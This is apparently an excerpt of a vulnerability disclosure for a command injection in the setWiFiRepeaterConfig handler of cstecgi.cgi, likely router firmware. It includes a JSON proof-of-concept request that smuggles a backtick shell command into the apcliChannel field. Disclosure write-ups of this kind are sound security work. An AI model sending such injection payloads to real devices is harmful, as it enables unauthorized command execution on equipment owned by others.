...
The vulnerability is located in the function `sub_415120` within `cstecgi.cgi`, also known as `setWiFiRepeaterConfig`.

![](Pasted%20image%2020231130173714.png)
...
therefore , by controlling parameter among  `apcliKey,apcliChannel...`(more in this function) , we can finally make an arbitrary command execution
...
{"operationMode":"3","apcliChannel":"`id > /1.txt;`","topicurl":"setWiFiRepeaterConfig","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130173948.png)